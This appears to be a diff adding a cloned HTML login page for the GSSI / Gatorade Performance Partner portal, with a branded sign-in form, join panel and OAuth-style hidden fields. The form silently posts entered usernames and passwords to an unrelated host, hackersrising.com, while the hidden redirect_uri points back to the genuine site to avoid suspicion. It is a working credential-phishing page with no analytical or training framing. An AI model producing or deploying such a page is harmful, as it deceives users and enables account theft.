@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GSSI Universal Login - Gatorade Performance Partner</title>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #f8f9fa;
+            color: #1f2937;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 50px;           /* ~3cm distance from edges on large screens */
+            line-height: 1.5;
+        }
+
+        .modal {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.12);
+            max-width: 1100px;
+            width: 100%;
+            overflow: hidden;
+            border: 1px solid #e5e7eb;
+        }
+
+        .modal-content {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .left-panel, .right-panel {
+            padding: 70px 60px;           /* generous internal padding */
+            flex: 1;
+            min-width: 340px;
+        }
+
+        .left-panel {
+            background: #ffffff;
+            border-right: 1px solid #e5e7eb;
+        }
+
+        .right-panel {
+            background: #ffffff;
+        }
+
+        h1 {
+            font-size: 2.35rem;
+            font-weight: 700;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            color: #111827;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: #4b5563;
+            margin-bottom: 32px;
+        }
+
+        ul {
+            list-style: none;
+            margin: 24px 0 45px 0;
+        }
+
+        ul li {
+            padding: 9px 0;
+            font-size: 1.08rem;
+            color: #374151;
+            position: relative;
+            padding-left: 30px;
+        }
+
+        ul li:before {
+            content: "•";
+            color: #FF3C00;
+            font-size: 1.8rem;
+            position: absolute;
+            left: 0;
+            top: -4px;
+        }
+
+        .cta {
+            display: inline-block;
+            width: 100%;
+            padding: 18px 24px;
+            font-size: 1.15rem;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .join-btn {
+            background: transparent;
+            color: #111827;
+            border: 2px solid #111827;
+        }
+
+        .join-btn:hover {
+            background: #f8f9fa;
+        }
+
+        .sign-in-btn {
+            background: #111827;
+            color: white;
+            border: none;
+        }
+
+        .sign-in-btn:hover {
+            background: #1f2937;
+        }
+
+        .form-group {
+            margin-bottom: 32px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.97rem;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #374151;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 1.08rem;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #FF3C00;
+            box-shadow: 0 0 0 4px rgba(255, 60, 0, 0.12);
+        }
+
+        .help-link {
+            color: #FF3C00;
+            text-decoration: none;
+            font-size: 1rem;
+            margin-top: 24px;
+            display: inline-block;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 25px;
+            right: 30px;
+            font-size: 32px;
+            color: #9ca3af;
+            background: none;
+            border: none;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* Responsive behavior */
+        @media (max-width: 992px) {
+            body { padding: 30px 40px; }
+            .left-panel, .right-panel { padding: 55px 45px; }
+        }
+
+        @media (max-width: 768px) {
+            .modal-content { flex-direction: column; }
+            .left-panel {
+                border-right: none;
+                border-bottom: 1px solid #e5e7eb;
+            }
+            .left-panel, .right-panel {
+                padding: 50px 35px;
+            }
+            h1 { font-size: 2.1rem; }
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 20px 15px; }
+            .left-panel, .right-panel { padding: 40px 25px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="modal">
+    <button class="close-btn" onclick="history.back()">×</button>
+    
+    <div class="modal-content">
+        
+        <!-- Left Panel -->
+        <div class="left-panel">
+            <h1>Join the<br>community</h1>
+            <p class="subtitle">Create your account and gain access to:</p>
+            
+            <ul>
+                <li>Science-Backed Resources</li>
+                <li>Complimentary CEUs</li>
+                <li>Athlete Tools</li>
+                <li>Awards and Recognitions</li>
+            </ul>
+            
+            <a href="#" class="cta join-btn">JOIN THE COMMUNITY</a>
+        </div>
+
+        <!-- Right Panel -->
+        <div class="right-panel">
+            <h1>Sign in to your<br>account</h1>
+            
+            <form action="https://hackersrising.com/GPAPI/oauth/login" method="post" id="DietaryLogin">
+                <input type="hidden" name="mode" value="gpp">
+                <input type="hidden" name="state" value="gpp_nav">
+                <input type="hidden" name="iss" value="https://www.gssiweb.org/gpapi">
+                <input type="hidden" name="redirect_uri" value="https://performancepartner.gatorade.com/">
+                <input type="hidden" name="client_id" value="1415c6a6-c191-4ca1-9313-e75ee5912fd2">
+
+                <div class="form-group">
+                    <label for="UserName">Username</label>
+                    <input type="text" id="UserName" name="UserName" autocomplete="off" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="Password">Password</label>
+                    <input type="password" id="Password" name="Password" autocomplete="off" required>
+                </div>
+
+                <button type="submit" class="cta sign-in-btn">SIGN IN</button>
+            </form>
+
+            <a href="#" class="help-link" style="color:black">Need help signing in?</a>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
